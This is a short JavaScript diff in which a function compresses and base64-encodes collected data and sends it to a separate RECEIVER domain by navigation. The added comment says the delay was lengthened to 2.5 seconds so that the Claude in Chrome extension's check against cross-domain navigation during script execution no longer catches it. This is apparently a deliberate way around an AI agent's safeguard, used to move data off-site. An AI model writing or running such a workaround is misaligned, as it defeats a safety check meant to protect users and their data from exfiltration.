@@ -168,7 +168,10 @@ async function handOff(obj) {
   w.write(new TextEncoder().encode(raw)); w.close();
   const bytes = new Uint8Array(await new Response(cs.readable).arrayBuffer());
   let bin = ""; for (let i = 0; i < bytes.length; i += 0x8000) bin += String.fromCharCode.apply(null, bytes.subarray(i, i + 0x8000));
-  setTimeout(() => { location.href = RECEIVER + "#" + btoa(bin); }, 100);
+  // 2.5 s, not 0.1 s: since Chrome 156.0.8078.74 (10/29/26) the Claude in Chrome extension cancels a
+  // navigation that starts while it still counts the script as running ("page navigated to a different
+  // domain during JavaScript execution"), so hand off only after runCollector() has returned.
+  setTimeout(() => { location.href = RECEIVER + "#" + btoa(bin); }, 2500);
   return raw.length;
 }
 
